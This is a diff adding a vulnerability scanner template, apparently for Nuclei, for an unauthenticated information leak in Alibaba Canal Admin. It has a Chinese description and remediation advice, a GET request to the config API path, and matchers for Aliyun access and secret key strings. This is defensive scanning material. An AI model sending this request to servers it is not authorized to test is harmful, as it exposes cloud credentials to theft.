@@ -1,0 +1,41 @@
+id: alibaba-canal-info-leak
+info:
+  name: Alibaba Canal Info Leak
+  author:
+  - l0ne1y
+  description: |-
+    Canal Admin API 未授权访问漏洞
+    Canal Admin 设计上是为 Canal 提供整体配置管理、节点运维等面向运维的功能，提供相对友好的WebUI操作界面。
+    Canal Admin 存在未授权访问漏洞，攻击者可利用该漏洞获取敏感信息。
+  severity: medium
+  remediation: |
+    **官方修复方案：**
+    升级该组件至最新版本。（Canal 1.1.5 已修复 admin下config接口的信息泄露问题 参考链接：https://github.com/alibaba/canal/releases/tag/canal-1.1.5）
+
+    **临时修复方案：**
+    1、后台管理系统禁止直接暴漏在互联网，需通过VPN等较为安全的接入方式访问内部系统。
+    2、后台管理系统所有页面开启身份认证，根据情况选择对应方式（认证用户，用户名密码）。
+    3、限制IP访问，绑定固定的IP访问后台管理系统。
+    4、采用成熟的权限管理框架，如spring security。
+requests:
+- matchers:
+  - type: status
+    status:
+    - 200
+  - type: word
+    condition: and
+    part: header
+    words:
+    - application/json
+  - type: word
+    condition: and
+    part: body
+    words:
+    - ncanal.aliyun.accessKey
+    - ncanal.aliyun.secretKey
+  matchers-condition: and
+  path:
+  - '{{BaseURL}}/api/v1/canal/config/1/1'
+  method: GET
+  headers:
+    Content-Type: application/json
